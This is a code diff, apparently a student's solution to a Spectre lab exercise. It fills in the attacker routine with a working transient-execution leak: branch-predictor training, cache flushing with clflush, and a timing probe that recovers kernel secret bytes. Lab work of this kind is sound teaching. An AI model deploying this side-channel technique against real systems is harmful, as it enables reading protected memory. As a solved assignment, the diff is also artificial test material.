@@ -45,8 +45,20 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
-        // [Part 2]- Fill this in!
-        // leaked_byte = ??
+
+        for(int l = 0; l < 512; l++) {
+            call_kernel_part2(kernel_fd, shared_memory, 0);
+        }    
+        for(int j = 0; j < 128; j++) {
+            clflush(shared_memory + 4096 * j);
+        }        
+        call_kernel_part2(kernel_fd, shared_memory, current_offset);    
+        for(int j = 0; j < 128; j++) {
+            if(time_access(shared_memory + 4096 * j) < 100) {
+                leaked_byte = j;
+                break;
+            }
+        }    
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
@@ -59,3 +71,4 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     close(kernel_fd);
     return EXIT_SUCCESS;
 }
+
